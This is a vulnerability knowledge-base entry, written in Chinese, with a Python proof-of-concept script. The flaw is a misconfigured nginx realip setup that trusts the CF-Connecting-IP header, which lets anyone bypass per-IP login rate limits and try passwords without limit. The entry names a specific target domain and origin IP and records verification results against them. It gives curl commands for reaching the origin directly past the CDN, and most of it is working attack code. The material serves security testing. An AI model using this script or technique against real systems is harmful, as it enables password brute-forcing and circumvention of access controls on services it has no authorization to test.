# nginx realip 信任客户端 CF-Connecting-IP → 登录接口按 IP 分桶的限流可被轮换头绕过（无限次口令尝试）

- **code**: nginx-realip-cf-connecting-ip-login-ratelimit-bucket-bypass
- **kind**: script
- **category**: auth-bypass
- **component**: nginx ngx_http_realip_module（set_real_ip_from 过宽 + real_ip_header CF-Connecting-IP）+ limit_req/limit_conn
- **versions**: nginx（realip 配置缺陷，非版本漏洞）；实测宿主 Sub2API 0.2.19-activities.3
- **severity**: medium
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: task#629 / finding 1301，2026-11-08 01:40-02:10 (UTC+8)，本机 Windows + python3.13（裸 socket 覆盖 getaddrinfo 到源站 IP 23.147.164.132:443，SNI/Host=dahurj999.top）对 POST /api/v1/auth/login 做四组对照：(A) 不带转发头背靠背 5 发 → #1 401/81B INVALID_CREDENTIALS，#2-#5 429/564B nginx Too Many Requests；(B) 每发不同 CF-Connecting-IP → 5/5、30/30、15/15 全部 401/81B 从不 429；(C) 固定同一 CF-Connecting-IP 连发 → 通过 5-7 发后转 429（7/15，与 A 的 5/15 同量级），排除「只要带头就不限流」；(D) 轮换 X-Forwarded-For / X-Real-IP / True-Client-IP / X-Client-IP / Forwarded 各 10-12 发 → pass 分别 9/15、8/12、5/12、7/12、1/12，均等于背景噪声。四组同时成立即判定限流桶按 realip 后的客户端 IP 分桶、该 IP 来自可伪造头。
- **path**: pocs/nginx-realip-cf-connecting-ip-login-ratelimit-bucket-bypass/cfip_realip_login_ratelimit_bypass.py
- **tags**: nginx,realip,cf-connecting-ip,rate-limit-bypass,limit_req,brute-force,login,sub2api,cloudflare-bypass,ip-spoof
- **created_at**: 2026-11-07T18:18:53.111Z
- **engine**: https://dahurj999.top（源站 23.147.164.132:443）
- **found_by**: vuln-scan

## 描述

前端 nginx（或 openresty）用 ngx_http_realip_module 把客户端 IP 取自请求头（本例 CF-Connecting-IP），且 set_real_ip_from 覆盖了公网（或干脆 trust 全部），于是 limit_req/limit_conn 与后端按 IP 的失败计数都以该头值为桶键。攻击者不再需要换出口 IP：每个请求换一个 CF-Connecting-IP 即获得全新配额，登录接口的「N 次/分钟」形同虚设，可无限次尝试口令。前提是能直连源站（或目标本身无 CDN）；经 Cloudflare 等 CDN 访问时 CDN 会覆写该头，手法失效。

## 用法

```
【前置】
1) 目标登录接口前面有 nginx 层的按 IP 限流（典型回显：HTTP 429 + 564B nginx 默认页 <title>429 Too Many Requests</title>）；
2) 能直连源站并保持 SNI/Host 为真实域名（curl --resolve / 裸 socket），因为走 CDN 时 CDN 会覆写 CF-Connecting-IP；
3) 邮箱用不存在的一次性地址，避免把真实账号打进锁定。

【跑法】
  python cfip_realip_login_ratelimit_bypass.py --host TARGET.TLD --ip <源站IP> --port 443 \
      --path /api/v1/auth/login
  # 无 CDN 时省略 --ip；http 站点加 --scheme http --port 80
  # 生产环境把 --n 降到 3-5、--cooldown 保持 65，别长时间高速打

【四组对照（缺一条就不能下结论）】
  A 基线：不带任何转发头，背靠背 N 发 → 期望 #1 通、#2 起 429。
  B 轮换 CF-Connecting-IP：每发换随机值 → 期望 100% 通过、0 个 429。
  C 固定同一 CF-Connecting-IP（用一个全新值）→ 期望前几发通过后转 429，量级与 A 相同；
    这条用来排除「只要带了这个头就不限流」的假阳性。
  D 轮换 X-Forwarded-For / X-Real-IP / True-Client-IP / X-Client-IP / Forwarded → 期望全部
    与 A 同量级（不被 realip 采信）。哪个头轮换后不再 429，哪个就是真正被采信的 realip 头。

【判据】A 有限流 ∧ B 零 429 ∧ C 会 429 ∧ 其余头无效 → 成立。脚本末尾打印 VERDICT。

【curl 快速复核（两发就能看出方向）】
  # 基线
  curl -sk --noproxy '*' --resolve T:443:<源站IP> https://T/api/v1/auth/login -H 'Content-Type: application/json' -d '{"email":"nobody-1@example.com","password":"Wrong#Pass123"}' -o /dev/null -w '%{http_code}\n'
  # 连发 4 次对比：无头 → 401,429,429,429；带 -H 'CF-Connecting-IP: 198.25.x.y'（每次换值）→ 401,401,401,401

【失败时的常见原因】
· 全部 429 / 轮换无效果 → 你其实经 CDN 在访问，头被 CDN 覆写。先确认 --resolve 钉的是源站，响应头里不应有 cf-ray/server: cloudflare。
· 全部 429 → 目标 nginx 没配 realip，或 real_ip_header 取的是别的头（用 D 组找）。
· 轮换也间歇 429 → 限流是「并发数 + 速率」双桶，或后端另有全局桶（如应用层 invalid_auth 共享桶，见 kb: sub2api-invalid-auth-rate-limit-429-shared-bucket-dos），头只能重置按 IP 那一层。
· 一直 401 但始终不 429 → 限流窗口很长或阈值很高，加大 N 再判，不要过早下阴性结论。
· 连接异常/证书错 → 本机 HTTP 代理在插手，必须裸 socket 或 curl --noproxy '*'。

【局限】只能放大 IP 维度配额；目标若还有账号级锁定、验证码、设备指纹，仍然卡住。别把「能无限试口令」当成「已拿到口令」。

【关联】同一根因的另一个利用面：kb sub2api-apikey-ip-whitelist-bypass-via-cf-connecting-ip（API Key 的 ip_whitelist 也能用该头伪造绕过）；源站直连暴露本身见 kb cloudflare-origin-ip-direct-exposure-dual-port-cdn-bypass。

----- 以下为 script 正文（cfip_realip_login_ratelimit_bypass.py）-----

```

## 正文

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
cfip_realip_login_ratelimit_bypass.py
---------------------------------------------------
判定「登录接口的限流桶是按 realip 后的客户端 IP 分的，而 realip 取自可伪造的
CF-Connecting-IP」——即：轮换该头 = 无限次登录尝试。

四组对照必须全部成立才下结论（单发一次通过不算数）:
  A 基线      : 不带任何转发头，背靠背 N 发          -> 第 2 发起应 429
  B 轮换CFIP  : 每发不同 CF-Connecting-IP           -> 应全部 401（不通限流）
  C 固定CFIP  : 固定一个全新 CF-Connecting-IP 连发   -> 前几发通过后转 429
  D 其它头    : 轮换 XFF / X-Real-IP / True-Client-IP / X-Client-IP / Forwarded
                                                     -> 应与基线同量级（不被采信）

用法:
  # 源站直连（推荐；走 CDN 时 CDN 会覆写 CF-Connecting-IP，本手法失效）
  python cfip_realip_login_ratelimit_bypass.py --host TARGET.TLD --ip 1.2.3.4 --port 443
  # 无 CDN 直接跑
  python cfip_realip_login_ratelimit_bypass.py --host TARGET.TLD --port 80 --scheme http

要点:
  * 一律裸 socket + ssl，绕开本机 HTTP 代理（requests/curl 走代理会把源 IP 换掉）。
  * 邮箱必须用不存在的一次性地址，避免把真实账号打进锁定。
  * 每组之间 sleep 一个限流窗口（--cooldown，默认 65s），否则桶互相污染。
  * 只适合授权测试；别对生产做长时间高速爆破。
"""
import argparse
import json
import random
import socket
import ssl
import sys
import time

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")


def build(host, ip, port, scheme, path, extra_headers, email, password, timeout):
    body = json.dumps({"email": email, "password": password}).encode()
    hdrs = [
        "POST %s HTTP/1.1" % path,
        "Host: %s" % host,
        "User-Agent: " + UA,
        "Accept: application/json, text/plain, */*",
        "Content-Type: application/json",
        "Content-Length: %d" % len(body),
        "Connection: close",
    ]
    for k, v in (extra_headers or {}).items():
        hdrs.append("%s: %s" % (k, v))
    return ("\r\n".join(hdrs) + "\r\n\r\n").encode() + body


def send(host, ip, port, scheme, path, extra_headers, email, password, timeout=15):
    raw = build(host, ip, port, scheme, path, extra_headers, email, password, timeout)
    if scheme == "https":
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = socket.create_connection((ip, port), timeout=timeout)
        sock = ctx.wrap_socket(sock, server_hostname=host)   # SNI 必须是域名
    else:
        sock = socket.create_connection((ip, port), timeout=timeout)
    try:
        sock.sendall(raw)
        buf = b""
        while True:
            chunk = sock.recv(65536)
            if not chunk:
                break
            buf += chunk
    finally:
        sock.close()
    head, _, bod = buf.partition(b"\r\n\r\n")
    try:
        status = int(head.split(b" ")[1])
    except Exception:
        status = 0
    snippet = bod[:70].replace(b"\r\n", b" ").decode("utf-8", "replace")
    return status, len(bod), snippet


def kv(headers):
    return ", ".join("%s=%s" % (k, v) for k, v in headers.items()) or "(none)"


def run_group(name, n, headers_fn, args, base_email):
    out = []
    for i in range(n):
        h = headers_fn(i)
        email = "nobody-%s%d@example.com" % (base_email, i)
        try:
            st, ln, sn = send(args.host, args.ip, args.port, args.scheme,
                              args.path, h, email, args.password, args.timeout)
        except Exception as e:                       # noqa: BLE001
            st, ln, sn = -1, 0, "EXC:%s" % e
        out.append((st, ln, kv(h) if h else "", sn))
        print("  [%02d] http=%-4s len=%-5s %-52s %s" % (i + 1, st, ln, kv(h) if h else "(none)", sn))
    passed = sum(1 for st, *_ in out if st not in (429, -1))
    limited = sum(1 for st, *_ in out if st == 429)
    print("  => %s: pass=%d/%d limited=%d" % (name, passed, n, limited))
    return passed, limited


def rand_ip():
    return "198.25.%d.%d" % (random.randint(1, 254), random.randint(1, 254))


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", required=True, help="SNI/Host，例 target.tld")
    ap.add_argument("--ip", default=None, help="源站 IP；省略则用系统解析")
    ap.add_argument("--port", type=int, default=443)
    ap.add_argument("--scheme", default="https", choices=["http", "https"])
    ap.add_argument("--path", default="/api/v1/auth/login")
    ap.add_argument("--password", default="Wrong#Pass123")
    ap.add_argument("--n", type=int, default=5, help="每组请求数")
    ap.add_argument("--cooldown", type=int, default=65, help="组间冷却秒数")
    ap.add_argument("--timeout", type=int, default=15)
    args = ap.parse_args()

    if not args.ip:
        args.ip = socket.getaddrinfo(args.host, args.port,
                                     proto=socket.IPPROTO_TCP)[0][4][0]
        print("[*] 未指定 --ip，解析得 %s（若目标在 CDN 后，这里拿到的是 CDN IP，"
              "CF-Connecting-IP 会被 CDN 覆写，本手法失效）" % args.ip)

    print("[*] target=%s://%s:%d%s" % (args.scheme, args.ip, args.port, args.path))
    print("[*] SNI/Host=%s  n=%d  cooldown=%ds\n" % (args.host, args.n, args.cooldown))

    tag = "%d" % random.randint(10, 99)

    print("== A 基线：不带转发头（证明限流确实在）")
    pa, la = run_group("baseline", args.n, lambda i: None, args, "a" + tag)

    time.sleep(args.cooldown)

    print("\n== B 轮换 CF-Connecting-IP（证明该头就是限流键）")
    pb, lb = run_group("rotate CF-Connecting-IP", args.n,
                       lambda i: {"CF-Connecting-IP": rand_ip()}, args, "b" + tag)

    time.sleep(args.cooldown)

    print("\n== C 固定同一个 CF-Connecting-IP（排除『只要带头就不限流』）")
    fixed = rand_ip()
    pc, lc = run_group("fixed CF-Connecting-IP=%s" % fixed, args.n,
                       lambda i: {"CF-Connecting-IP": fixed}, args, "c" + tag)

    time.sleep(args.cooldown)

    print("\n== D 轮换其它转发头（应 == 基线噪声，即不被 realip 采信）")
    other_headers = ["X-Forwarded-For", "X-Real-IP", "True-Client-IP",
                     "X-Client-IP", "Forwarded"]
    results = {}
    for hd in other_headers:
        def mk(hd=hd):
            def f(i):
                if hd == "Forwarded":
                    return {hd: "for=%s;proto=https" % rand_ip()}
                return {hd: rand_ip()}
            return f
        p, l = run_group("rotate " + hd, args.n, mk(), args, "d" + tag + hd[:3])
        results[hd] = (p, l)
        time.sleep(max(5, args.cooldown // 2))

    print("\n" + "=" * 72)
    print("结论矩阵")
    print("  A baseline                 pass=%d/%d limited=%d  (期望 1~2 通过后 429)" % (pa, args.n, la))
    print("  B rotate CF-Connecting-IP  pass=%d/%d limited=%d  (期望 全通过)" % (pb, args.n, lb))
    print("  C fixed  CF-Connecting-IP  pass=%d/%d limited=%d  (期望 与 A 同量级)" % (pc, args.n, lc))
    for hd, (p, l) in results.items():
        print("  D rotate %-16s pass=%d/%d limited=%d  (期望 与 A 同量级)" % (hd, p, args.n, l))

    ok_a = la > 0
    ok_b = lb == 0 and pb == args.n
    ok_c = lc > 0
    ok_d = all(l > 0 for _p, l in results.values())
    verdict = ok_a and ok_b and ok_c and ok_d
    print("\nVERDICT: %s" % ("HIT — 限流桶按 realip(CF-Connecting-IP) 分，轮换即无限尝试"
                             if verdict else "NOT PROVEN — 逐条核对 A/B/C/D 哪一条不成立"))
    print("提醒: 本手法只放大 IP 配额；若目标另有账号级锁定/验证码，仍会被卡住。")
    return 0 if verdict else 1


if __name__ == "__main__":
    sys.exit(main())

```
